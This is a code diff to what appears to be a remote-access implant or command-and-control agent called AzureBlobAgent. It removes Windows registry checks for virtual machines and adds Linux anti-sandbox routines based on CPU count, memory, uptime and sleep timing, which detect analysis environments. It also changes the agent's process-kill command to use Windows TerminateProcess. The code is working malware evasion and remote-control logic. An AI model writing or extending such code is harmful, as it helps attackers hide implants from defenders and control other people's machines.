@@ -105,23 +105,7 @@ class AzureBlobAgent:
 
     def _anti_sandbox(self):
         if not _IS_WINDOWS:
-            return False
-        try:
-            import winreg
-            vm_keys = [
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
-                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
-                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmci"),
-            ]
-            for hive, path in vm_keys:
-                try:
-                    winreg.OpenKey(hive, path)
-                    return True
-                except OSError:
-                    pass
-        except Exception:
-            pass
+            return self._anti_sandbox_linux()
         try:
             if os.cpu_count() is not None and os.cpu_count() < 2:
                 return True
@@ -154,6 +138,38 @@ class AzureBlobAgent:
         try:
             uptime_ms = ctypes.windll.kernel32.GetTickCount64()
             if uptime_ms < 600000:
+                return True
+        except Exception:
+            pass
+        try:
+            t0 = time.perf_counter()
+            time.sleep(0.5)
+            elapsed = time.perf_counter() - t0
+            if elapsed < 0.4:
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _anti_sandbox_linux(self):
+        try:
+            if os.cpu_count() is not None and os.cpu_count() < 2:
+                return True
+        except Exception:
+            pass
+        try:
+            with open("/proc/meminfo", "r") as f:
+                for line in f:
+                    if line.startswith("MemTotal:"):
+                        kb = int(line.split()[1])
+                        if kb < 2 * 1024 * 1024:
+                            return True
+                        break
+        except Exception:
+            pass
+        try:
+            uptime = float(open("/proc/uptime").read().split()[0])
+            if uptime < 600:
                 return True
         except Exception:
             pass
@@ -614,11 +630,24 @@ class AzureBlobAgent:
     def _cmd_kill(self, task):
         params = self._parse_params(task)
         pid = params.get("pid", 0)
-        sig = params.get("signal", 9)
         if not pid:
             return {"user_output": "No PID specified", "status": "error"}
-        os.kill(int(pid), int(sig))
-        return {"user_output": f"Sent signal {sig} to PID {pid}"}
+        pid = int(pid)
+        if _IS_WINDOWS:
+            try:
+                k32 = ctypes.windll.kernel32
+                handle = k32.OpenProcess(0x0001, False, pid)
+                if handle:
+                    k32.TerminateProcess(handle, 1)
+                    k32.CloseHandle(handle)
+                else:
+                    return {"user_output": f"Cannot open PID {pid}", "status": "error"}
+            except Exception as e:
+                return {"user_output": str(e), "status": "error"}
+        else:
+            sig = int(params.get("signal", 9))
+            os.kill(pid, sig)
+        return {"user_output": f"Killed PID {pid}"}
 
     def _cmd_screenshot(self, task):
         if _IS_WINDOWS:
